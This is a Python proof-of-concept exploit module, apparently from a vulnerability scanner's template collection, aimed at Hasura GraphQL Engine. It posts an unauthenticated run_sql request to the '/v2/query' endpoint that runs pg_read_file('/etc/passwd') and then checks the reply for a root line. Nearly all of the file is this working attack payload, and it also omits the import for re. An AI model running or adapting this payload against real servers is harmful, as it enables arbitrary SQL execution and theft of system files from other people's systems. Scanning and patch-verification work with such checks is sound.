import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Hasura GraphQL Engine - postgresql query exec''',
        "description": '''A vulnerability in Hasura GraphQL Engine allows remote unauthenticated users to execute arbitrary SQL statements via the '/v2/query' endpoint.''',
        "severity": "critical",
        "references": [
            "https://www.exploit-db.com/exploits/49802"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["hasura", "rce", "graphql"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/v2/query"""
        method = "POST"
        data = """{
  "type": "bulk",
  "source": "default",
  "args":[
    {
      "type": "run_sql",
      "args": {
        "source":"default",
        "sql":"SELECT pg_read_file('/etc/passwd',0,100000);",
        "cascade": false,
        "read_only": false
      }
    }
  ]
}"""
        headers = {'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0:""",resp0.text)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url